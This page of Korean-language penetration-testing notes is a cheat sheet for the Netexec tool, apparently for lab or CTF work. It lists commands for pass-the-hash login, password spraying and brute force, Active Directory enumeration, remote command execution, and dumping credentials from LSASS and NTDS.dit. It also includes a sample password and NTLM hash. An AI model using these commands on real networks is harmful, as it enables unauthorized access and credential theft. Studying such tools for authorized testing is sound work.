---
layout: page
title: netexec
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

# Netexec (nxc) 활용 가이드

Netexec(구 CrackMapExec)은 대규모 네트워크 환경에서 인증 정보를 테스트하고, 시스템을 열거하며, 원격으로 명령을 실행하는 데 사용되는 매우 강력한 자동화 도구입니다. 특히 Active Directory 환경에서 대단히 효율적입니다.

---

### **1. 기본 사용법 및 인증 테스트**

- **목표:** 단일 또는 다수의 시스템을 대상으로 주어진 인증 정보가 유효한지 확인합니다.
- **기본 구문:** `netexec <protocol> <targets> -u <user> -p <password>`

```bash
# SMB 프로토콜을 통해 익명으로 접속하여 기본 정보(OS, 도메인 등) 확인
netexec smb $target
```

```bash
# 특정 사용자와 비밀번호로 SMB 로그인을 시도하고, 성공 시 "(Pwned!)"가 표시됨
netexec smb $target -u 't-skid' -p 'tj072889*'
```

```bash
# 비밀번호 대신 NTLM 해시를 사용하여 인증
netexec smb $target -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d'
```

---

### **2. 대규모 인증 테스트 (Password Spraying & Brute-force)**

- **목표:** 사용자 목록과 비밀번호 목록을 이용해 대규모 인증을 시도하여 유효한 자격증명 조합을 찾아냅니다.

```bash
# 여러 사용자에게 하나의 비밀번호를 대입
# --continue-on-success: 성공해도 멈추지 않고 계속 진행
netexec smb $target -u users.txt -p 'ResetMe123!' --continue-on-success
```

```bash
# 하나의 사용자에게 여러 비밀번호를 대입 (계정 잠금 정책 주의!)
netexec smb $target -u 'Jareth' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

---

### **3. 정보 수집 모듈**

- **목표:** 인증 성공 후, `--<module>` 옵션을 사용하여 특정 정보를 수집합니다.

```bash
# 공유 폴더 목록 및 권한 확인
netexec smb $target -u <user> -p <pass> --shares

# 유저 리스트, 설명
netexec smb $target -u <user> -p <pass> --users

# 패스워드 정책 확인
netexec smb $target -u <user> -p <pass> --pass-pol

# RID Cycling을 통해 도메인 사용자 목록 덤프
netexec smb $target -u <user> -p <pass> --rid-brute

# BloodHound 데이터 수집
netexec smb $target -u <user> -p <pass> --bloodhound -c all
```

---

### **4. 원격 명령어 실행**

- **목표:** 유효한 자격증명을 사용하여 원격 시스템에서 명령어를 실행합니다.

```bash
# -x <command>: 원격으로 cmd 명령어를 실행
netexec smb $target -u <user> -p <pass> -x 'whoami'

# -X <ps_command>: 원격으로 PowerShell 명령어를 실행
netexec smb $target -u <user> -p <pass> -X '$PSVersionTable'
```

```bash
# -M <module_name>: 다양한 기능을 가진 내장 모듈 실행

# lsassy 모듈로 LSASS 프로세스 덤프 시도
netexec smb $target -u <user> -p <pass> -M lsassy

# ntdsutil 모듈로 NTDS.dit 파일 덤프 시도 (DC 대상)
netexec smb $DC_IP -u <DA_user> -p <pass> -M ntdsutil
```

> **지원 프로토콜:** `smb` 외에도 `winrm`, `rdp`, `ldap`, `ssh`, `mssql` 등 다양한 프로토콜을 지원하여 여러 환경에서 활용할 수 있습니다.


